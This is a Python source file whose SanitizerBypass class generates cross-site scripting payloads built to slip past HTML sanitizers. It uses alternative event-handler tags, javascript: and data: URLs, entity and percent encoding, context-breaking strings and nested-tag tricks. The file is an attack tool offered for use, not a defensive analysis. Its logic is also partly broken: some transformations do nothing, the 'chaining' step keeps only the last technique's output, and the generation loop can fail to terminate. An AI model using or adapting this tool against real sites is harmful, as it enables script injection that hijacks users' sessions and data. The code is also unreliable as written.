import random
import html

class SanitizerBypass:
    def __init__(self):
        self.bypass_patterns = [
            "tag_alternatives",
            "attribute_alternatives", 
            "encoding_evasion",
            "context_switching",
            "recursive_parsing"
        ]
    
    def tag_alternatives(self, payload):
        """Use alternative tags that might not be filtered"""
        tag_alternatives = {
            '<script>': [
                '<svg onload>',
                '<img src=x onerror>',
                '<body onload>',
                '<iframe src=javascript:>',
                '<video src=x onerror>',
                '<audio src=x onerror>',
                '<object data=javascript:>',
                '<embed src=javascript:>'
            ],
            'alert(1)': [
                'prompt(1)',
                'confirm(1)',
                'console.log(1)',
                'eval(\'alert(1)\')',
                'setTimeout("alert(1)")'
            ]
        }
        
        result = payload
        for original, alternatives in tag_alternatives.items():
            if original in result:
                result = result.replace(original, random.choice(alternatives))
        return result
    
    def attribute_alternatives(self, payload):
        attribute_techniques = [
            # different quote styles
            lambda p: p.replace('onerror=', "onerror="),
            lambda p: p.replace('onerror=', 'onerror='),
            lambda p: p.replace('onerror=', "OnErRoR="),
            
            # no quotes
            lambda p: p.replace('onerror="', 'onerror=').replace('"', ''),
            
            # tab/space separation
            lambda p: p.replace('onerror', 'onerror\t'),
            lambda p: p.replace('onerror', 'onerror\n'),
            
            # JavaScript protocol variations
            lambda p: p.replace('javascript:', 'JavaScript:'),
            lambda p: p.replace('javascript:', 'java\u0000script:'),
            lambda p: p.replace('javascript:', 'jAvasCrIpt:')
        ]
        
        technique = random.choice(attribute_techniques)
        return technique(payload)
    
    def encoding_evasion(self, payload):
        encoding_techniques = [
            # HTML entity encoding
            lambda p: html.escape(p).replace('&gt;', '>').replace('&lt;', '<'),
            
            # mix encoding
            lambda p: p.replace('<', '&lt;').replace('>', '>'),
            lambda p: p.replace('<', '%3C').replace('>', '%3E'),
            
            # decimal
            lambda p: ''.join(f'&#{ord(c)};' for c in p),
            
            # Hex   
            lambda p: ''.join(f'&#x{ord(c):x};' for c in p)
        ]
        
        technique = random.choice(encoding_techniques)
        return technique(payload)
    
    def context_switching(self, payload):
        context_switchers = [
            # HTML to JS context
            f'</script><script>{payload}</script><script>',
            f'</style><script>{payload}</script><style>',
            
            # CSS escape
            f'</style><script>{payload}</script><style>',
            f'{{x:expression({payload})}}',
            
            # URL context
            f'javascript:{payload}',
            f'vbscript:{payload}',
            f'data:text/html,{payload}'
        ]
        
        return random.choice(context_switchers)
    
    def recursive_parsing(self, payload):
        recursive_payloads = [
            # nested tags, wild
            f'<<script>{payload}</script>',
            f'<scr<script>ipt>{payload}</scr</script>ipt>',
            
            # comment breaking
            f'<!--</script><script>{payload}</script>-->',
            f'<!--><script>{payload}</script>-->',
            
            # invalid syntax that might parse
            f'<script/{payload}>',
            f'<script {payload}>'
        ]
        
        return random.choice(recursive_payloads)
    
    def generate_sanitizer_bypass_payloads(self, original_payload, count=12):
        bypassed = set()
        
        techniques = [
            lambda: self.tag_alternatives(original_payload),
            lambda: self.attribute_alternatives(original_payload),
            lambda: self.encoding_evasion(original_payload),
            lambda: self.context_switching(original_payload),
            lambda: self.recursive_parsing(original_payload)
        ]
        
        while len(bypassed) < count:
            # 1-2 techniques randomly
            num_tech = random.randint(1, 2)
            selected = random.sample(techniques, num_tech)
            
            current = original_payload
            for tech in selected:
                current = tech()
            
            bypassed.add(current)
        
        return list(bypassed)[:count]

sanitizer_bypass = SanitizerBypass()
